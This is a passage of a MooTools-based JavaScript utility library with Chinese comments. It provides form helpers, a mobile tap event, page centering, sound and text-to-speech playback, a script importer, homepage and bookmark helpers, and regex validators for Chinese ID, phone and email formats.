                            if (t.ID == selected) t.selected = true;
                            return t.ParentID == parentID;
                        });
                        opList.bind(drpObj, options);
                        parentID = drpObj.get("value").toInt();
                        drpObj.fade(isNaN(parentID) ? "hide" : "show");
                    });
                }
            }).post({
                "Value": value,
                "DefaultValue": getDefaultValue(obj).join(",")
            });
            objs.set("disabled", true);
        });
    };

    // 设置元素为只读
    Element.ReadOnly = function (el) {
        el = document.id(el);
        switch (el.get("tag")) {
            case "select":
                el.removeEvents("change");
                var value = Element.GetValue(el);
                el.addEvent("change", function (e) {
                    Element.SetValue(el, value);
                });
                break;
        }
    };

    // 自动获取下一个元素
    Element.GetNext = function (obj) {
        var next = null;
        switch (obj.get("tag")) {
            case "input":
            case "textarea":
            case "select":
                var from = obj.getParent("form");
                if (from != null) {
                    var list = from.getElements("input,textarea,select");
                    if (list.length > 1) {
                        var index = list.indexOf(obj);
                        index++;

                        if (list.length > index) {
                            next = list[index];
                        }
                    }
                }
                break;
        }
        return next;
    };

    // 元素内容为空的时候设置一个样式
    Element.SetEmptyFocus = function (obj, cssName) {
        obj = document.id(obj);
        if (obj == null) return;
        if (!cssName) cssName = "empty-focus";

        obj.addEvents({
            "focus": function () {
                this.removeClass(cssName);
            },
            "blur": function (e) {
                if (this.get("value") == "") {
                    this.addClass(cssName);
                }
            }
        });

        (function () {
            obj.fireEvent("blur");
        }).delay(1000);
    };

    // 获取子元素下面所有有名字的字段
    Element.GetData = function (obj) {
        var data = new Object();
        if (!obj) obj = document.id(document.body);
        obj.getElements("[name]").each(function (item) {
            data[item.get("name")] = item.get("value");
        });
        return data;
    };

    // 设置选中之后的样式
    Element.SetCurrent = function (list, cssName, condtion) {
        if (!cssName) cssName = "current";
        if (!condtion) condtion = function (obj) {
            var input = obj.getElement("input[type=radio]");
            if (input == null) return false;
            return input.get("checked");
        };

        list.each(function (item) {
            if (condtion.apply(this, [item])) {
                item.addClass(cssName);
            } else {
                item.removeClass(cssName);
            }
        });
    };

    // 绑定数据到select上
    Element.Select = function (obj, data, options) {
        if (!options) options = new Object();
        if (options.empty) obj.empty();
        if (!options.text) options.text = function (value) { return value; }

        Object.each(data, function (value, key) {
            new Element("option", {
                "text": options.text(value),
                "value": key,
                "selected": options.value && options.value == key ? true : null
            }).inject(obj);
        });
    };
}();

// 自定义添加的事件
!function () {
    // tap事件（移动端专用）
    !function () {
        var disabled;
        console.log("tap");
        Element.Events["tap"] = {
            "onAdd": function (fn) {
                var t = this;
                var target = null;
                t.addEvents({
                    "touchstart": function (e) {
                        target = t;
                    },
                    "touchend": function (e) {
                        if (target) {
                            fn.apply(t, [e]);
                        }
                    },
                    "touchmove": function (e) {
                        target = null;
                    }
                });
            }
        };
    }();
}();

// 基类方法

!function (ns) {
    // 获取网页大小
    ns.getSize = function () {
        /// <summary>
        /// 获取屏幕宽高 返回JSON对象 {x : ,y : , height , top }
        /// x 、 y 为网页可视区域的宽高。 height为网页全部内容的高  top为当前网页被卷去的高度
        /// </summary>

        var height = Math.max(document.documentElement.scrollHeight, document.documentElement.clientHeight);
        if (height > window.screen.availHeight) height = document.documentElement.clientHeight;
        var width = document.documentElement.clientWidth;
        return {
            x: width, y: height,
            width: width,
            height: document.id(document.body).getSize().y,
            top: Math.max(document.body.scrollTop, document.documentElement.scrollTop)
        };
    };

    // 居中一个元素
    ns.center = function (obj, container) {
        /// <summary>
        /// 设置obj居中
        /// </summary> 
        /// <param name="obj">要居中的对象</param>
        /// <param name="container">相对居中的容器。可选项，不填表示body</param>
        obj = document.id(obj);
        if (container == undefined) container = document.body;
        container = document.id(container);
        var body = UI.getSize();
        var position = obj.getCoordinates();
        obj.setStyles({
            "left": (body.x - position.width) / 2,
            "top": (body.height - position.height) / 2 < 0 ? 0 :
                (Browser.ie6 ? (body.height - position.height) / 2 + body.top : (body.height - position.height) / 2)
        });
        return { x: (body.x - position.width) / 2, y: (body.height - position.height) / 2 };
    };

    // 获取当前的声音状态
    ns.SoundState = function () {
        var id = "UI_Sound_Player";
        var value = localStorage.getItem(id);
        return value == null || value == "1";
    };

    // 声音开关 返回当前的状态（true：开启  false：关闭）
    ns.SoundSwitch = function () {
        var id = "UI_Sound_Player";
        var state = !UI.SoundState();
        localStorage.setItem(id, state ? 1 : 0);
        if (!state) {
            var obj = document.id(id);
            if (obj) obj.dispose();
        }
        return state;
    };

    // 播放声音(使用flash播放）
    ns.Sound = function (sound, options) {
        var id = "UI_Sound_Player";
        var obj = document.id(id);
        if (!UI.SoundState()) {
            if (obj) obj.dispose();
            return;
        }
        if (!sound) {
            if (obj) obj.dispose();
            return;
        }
        if (/^\w+$/i.test(sound)) {
            sound = _gPath + "/sound/" + sound + ".mp3";
        }
        var hasVideo = !!(document.createElement('video').canPlayType);
        if (!options) options = {};

        if (obj == null) {
            if (hasVideo) {
                obj = new Element("audio", {
                    "id": id,
                    "autoplay": "autoplay"
                });
                obj.inject(document.body);
            } else {
                if (window["Swiff"]) {
                    obj = new Swiff(_gPath + "/images/dewplayer.swf", {
                        id: id,
                        width: 0,
                        height: 0,
                        param: {
                            "wmode": "transparent"
                        },
                        vars: {
                            mp3: sound,
                            javascript: "on",
                            autostart: "true"
                        },
                        styles: {
                            "position": "absolute",
                            "top": 0,
                            "left": 0,
                            "display": "none"
                        }
                    });
                    obj.inject(document.body);
                }
            }
        }
        if (hasVideo) {
            obj.set("src", sound);
            if (options["loop"]) {
                obj.set("loop", "loop");
            } else {
                obj.removeAttribute("loop");
            }
        } else {
            if (obj && obj.dewset && !reload) {
                try {
                    obj.dewset(sound);
                } catch (ex) {
                    obj.dispose();
                    UI.Sound(sound, ex);
                }
            }
        }
    };

    // 使用百度云的文字语音播放
    ns.SoundText = function (text) {
        //http://fanyi.baidu.com/gettts?lan=zh&text=%E8%AF%B7%E6%B1%82&spd=5&source=web
        var url = "http://fanyi.baidu.com/gettts?lan=zh&spd=5&source=web&text=" + text;
        UI.Sound(url);
    };

    // 产生一个Guid的随机数
    ns.NewGuid = function (format) {
        switch (format) {
            case "N":
            case "n":
                format = "xxxxxxxxxxxx4xxxyxxxxxxxxxxxxxxx";
                break;
            default:
                format = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx";
                break;
        }
        return format.replace(/[xy]/g, function (c) {
            var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    };

    // 定时运行几次
    ns.CountDown = function (count, callback, timer) {
        if (!timer) timer = 1000;
        var countIndex = 0;
        var index = setInterval(function () {
            countIndex++;
            callback.apply(this, [countIndex]);
            if (countIndex == count) {
                clearInterval(countIndex);
            }
        }, timer);
    };

}(UI);

/*  扩展mootools的方法   */

Object.get = function (obj, key, ignoreCase) {
    /// <summary>
    /// 获取object的指定key对象。
    /// </summary>
    /// <param name="obj">要进行查找的JSON对象</param>
    /// <param name="key">要获取的key。</param>
    /// <param name="ignoreCase">是否区分key的大小写，默认为不区分</param>
    var value = null;
    Object.each(obj, function (v, k) {
        if (key == k || (!ignoreCase && key.toLowerCase() == k.toLowerCase())) value = v;
    });
    return value;
};

// 已经加载的文件列表。
var _importList = new Array();

// 库文件根目录
var _gPath = (function () {
    var str = "/scripts/mootools.js";
    var es = document.getElementsByTagName("script");
    for (var i = 0; i < es.length; i++) {
        var src = es[i].src;
        if (src.toLowerCase().substr(src.length - str.length) == str) {
            return src.substr(0, src.length - str.length);
        }
    }
    return "";
})();

function $import(file, isSync, refresh) {
    /// <summary>
    /// 引用js或者样式库
    /// </summary>
    /// <param name="file">要引用的文件路径 如果无路径符号则引用公共库中的文件</param>
    /// <param name="isSync">Boolean 同步或者异步引用 默认为true</param>
    /// <param name="refresh">Boolean 重新加载时候是否主动刷新 默认为false</param>
    // if (location.href.toLowerCase().contains("/demo/")) { _gPath = "/resources" }
    if (refresh == undefined) refresh = false;
    if (_importList.contains(file)) {
        if (refresh) {
            $$("head script").each(function (item) {
                if (item.get("src") == null) return;
                if (item.get("src").EndWith(file)) {
                    item.dispose();
                }
            });
        } else {
            return;
        }
    }

    _importList.push(file);
    if (isSync == undefined) isSync = true;
    if (!file.contains("/") && file.EndWith(".js")) file = _gPath + "/scripts/" + file;
    if (!file.contains("/") && file.EndWith(".css")) file = _gPath + "/styles/" + file;
    var header = document.getElementsByTagName("head")[0];
    var el = null;
    var fileExt = file.substring(file.lastIndexOf('.'));
    if (fileExt.StartWith(".js")) {
        el = isSync ? "<script language=\"javascript\" type=\"text/javascript\" src=\"" + file + "\"></script>" : new Element("script", {
            "language": "javascript",
            "type": "text/javascript",
            "src": file
        });
    } else if (fileExt.StartWith(".css")) {
        el = isSync ? "<link type=\"text/css\" rel=\"Stylesheet\" href=\"" + file + "\" />" : new Element("link", {
            "type": "text/css",
            "rel": "Stylesheet",
            "href": file
        });
    }
    isSync ? document.write(el) : el.inject($(header));
};

// 设为首页
function SetHome(obj, url) {
    if (vrl == undefined) url = location.host;
    try {
        obj.style.behavior = "url(#default#homepage)";
        obj.setHomePage(url);
    } catch (e) {
        if (window.netscape) {
            try {
                netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect");
            } catch (e) {
                alert("\u62B1\u6B49\uFF01\u60A8\u7684\u6D4F\u89C8\u5668\u4E0D\u652F\u6301\u76F4\u63A5\u8BBE\u4E3A\u9996\u9875\u3002\u8BF7\u5728\u6D4F\u89C8\u5668\u5730\u5740\u680F\u8F93\u5165\u201Cabout:config\u201D\u5E76\u56DE\u8F66\u7136\u540E\u5C06[signed.applets.codebase_principal_support]\u8BBE\u7F6E\u4E3A\u201Ctrue\u201D\uFF0C\u70B9\u51FB\u201C\u52A0\u5165\u6536\u85CF\u201D\u540E\u5FFD\u7565\u5B89\u5168\u63D0\u793A\uFF0C\u5373\u53EF\u8BBE\u7F6E\u6210\u529F\u3002");
            }
            var prefs = Components.classes['@mozilla.org/preferences-service;1'].getService(Components.interfaces.nsIPrefBranch);
            prefs.setCharPref("browser.startup.homepage", url);
        }
    }
}

// 加入收藏夹
function addBookmark(title) {
    if (title == undefined) title = document.title;
    var url = parent.location.href;

    try {
        //IE 
        window.external.addFavorite(url, title);
    } catch (e) {
        try {
            //Firefox 
            window.sidebar.addPanel(title, url, "");
        } catch (e) {
            alert("加入收藏失败，请使用Ctrl+D进行添加,或手动在浏览器里进行设置！", "提示信息");
        }
    }

}

// 设置iframe的高度为自适应自身高度
function setIframeHeight(iframeID) {
    parent.document.all(iframeID).height = parent.document.all(iframeID).style.height = document.id(document.body).getStyle("height").toInt();
}



// 常用的正则表达式验证
var Regex = {
    test: function (type, value) {
        if (!Regex[type]) return null;

        switch (typeof (Regex[type])) {
            case "function":
                return Regex[type].apply(this, [value]);
                break;
            default:
                return Regex[type].test(value);
                break;
        }
        return null;
    },
    "qq": /^[1-9]\d{4,9}$/,     // QQ号
    "email": /^\w[-\w.+]*@([A-Za-z0-9][-A-Za-z0-9]+\.)+[A-Za-z]{2,14}$/,     // 电子邮件
    "phone": /^(\d{3,4}-)\d{7,8}(-\d{1,6})?$/,
    "mobile": /^(13\d|14[57]|15[^4,\D]|17[13678]|18\d)\d{8}|170[0589]\d{7}$/,
    "date": /^\d{4}\-[01]?\d\-[0-3]?\d$|^[01]\d\/[0-3]\d\/\d{4}$|^\d{4}年[01]?\d月[0-3]?\d[日号]$/,
    "int": /^\d+$/,
    "integer": /^[1-9][0-9]*$/,
    "number": /^[+-]?[1-9][0-9]*(\.[0-9]+)?([eE][+-][1-9][0-9]*)?$|^[+-]?0?\.[0-9]+([eE][+-][1-9][0-9]*)?$/,
    "numberwithzero": /^[0-9]+$/,
    "money": /^\d+(\.\d{0,2})?$/,
    "alpha": /^[a-zA-Z]+$/,
    "alphanum": /^[a-zA-Z0-9_]+$/,
    "betanum": /^[a-zA-Z0-9-_]+$/,
    "cnid": /^\d{15}$|^\d{17}[0-9a-zA-Z]$/,     // 身份证号码
    "urls": /^(http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?$/, //URL全称
    "url": /^(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?$/, //URL相对路径
    "chinese": /^[\u2E80-\uFE4F]+$/, //中文
    "postal": /^[0-9]{6}$/, //邮编
    "mutiyyyymm": /(20[0-1][0-9]((0[1-9])|(1[0-2]))[\,]?)+$/,  // 多个YYYYMM中间用逗号隔开的方式
    "name": /^([\u4e00-\u9fa5|A-Z|\s]|\u3007)+([\.\uff0e\u00b7\u30fb]?|\u3007?)+([\u4e00-\u9fa5|A-Z|\s]|\u3007)+$/,   //用户名。 允许中文，不允许特殊字符
    "username": /^[a-zA-Z0-9_\u4e00-\u9fa5]{2,16}$/,
    "password": /^.{5,16}$/,   // 密码，5～16位之间
    "realname": /^[\u2E80-\uFE4F]{2,5}$/,  // 中文的真实姓名 2～5位之间
    "passport": /^[a-z0-9]\d{7,8}$/i,
    "company": /^\d{15}$/,  // 企业营业执照号码 15位
    "idcard": function (value) {    // 大陆身份证校验
        if (!/^\d{17}[0-9Xx]|\d{15}$/i.test(value)) return false;
        if (/x/.test(value)) value = value.replace("x", "X");
        var w = new Array(7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2);
        var map = new Array("1", "0", "X", "9", "8", "7", "6", "5", "4", "3", "2");
        var sum = 0;
        var index = 0;
        for (var i = 0; i < value.length - 1; i++) {
            sum = sum + value[i] * w[i];
        }
        return map[sum % 11].toLowerCase() == value[value.length - 1].toLowerCase();
    }
};


